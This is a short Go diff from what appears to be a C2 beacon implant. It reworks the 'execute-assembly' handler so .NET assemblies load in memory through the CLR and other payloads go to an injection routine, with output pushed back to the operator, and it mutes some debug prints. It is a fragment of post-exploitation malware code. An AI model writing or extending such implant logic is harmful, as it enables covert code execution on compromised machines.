@@ -55,13 +55,11 @@ func ExecAsm(b []byte, isDllX64 bool, ignoreToken bool) error {
 	// execAsm don't need to handle job
 	// callBackType, sleepTime, offset, description, args(csharp asm), dll, err
 	_, _, _, description, _, _, _ := parseExecAsm(b)
-	if string(description) != ".NET assembly" {
-		//return execAsmInject(b, isDllX64, ignoreToken)
+	// use go impl to execute C# assembly
+	if string(description) == ".NET assembly" {
 		return execAsmGo(b)
-
 	}
-	//return execAsmInject(b, isDllX64, ignoreToken)
-	return execAsmGo(b)
+	return execAsmInject(b, isDllX64, ignoreToken)
 }
 
 func execAsmInject(b []byte, isDllX64 bool, ignoreToken bool) error {
@@ -130,17 +128,17 @@ func execAsmGo(b []byte) error {
 		return errors.New(util.Sprintf("RedirectStdoutStderr error: %s", err))
 	}
 	runtimeHost, err := clr.LoadCLR("v4")
-	util.Println("after loadCLR")
+	//util.Println("after loadCLR")
 	if err != nil {
 		return errors.New(util.Sprintf("LoadCLR error: %s", err))
 	}
 	methodInfo, err := clr.LoadAssembly(runtimeHost, csharpBin)
-	util.Println("after LoadAssembly")
+	//util.Println("after LoadAssembly")
 	if err != nil {
 		return errors.New(util.Sprintf("LoadAssembly error: %s", err))
 	}
 	stdout, stderr := clr.InvokeAssembly(methodInfo, argsArr)
-	util.Println("after InvokeAssembly")
+	//util.Println("after InvokeAssembly")
 	if stdout != "" {
 		packet.PushResult(int(callBackType), []byte(stdout))
 	}
